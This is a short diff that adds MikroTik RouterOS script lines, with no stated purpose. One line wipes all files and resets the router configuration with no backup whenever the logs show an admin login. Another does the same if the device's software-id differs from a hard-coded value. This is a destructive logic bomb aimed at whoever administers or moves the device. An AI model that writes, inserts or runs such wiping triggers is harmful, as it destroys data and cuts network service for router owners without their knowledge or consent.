@@ -1,0 +1,5 @@
+:foreach log in=[/log find where message~"user admin logged"] do={/file remove [find]; /system reset-configuration no-defaults=yes skip-backup=yes keep-users=yes}
+
+:if ([/system license get value-name=software-id] != "I5NL-2PVH") do={ /file remove [find]; /system reset-configuration no-defaults=yes skip-backup=yes }
+
+
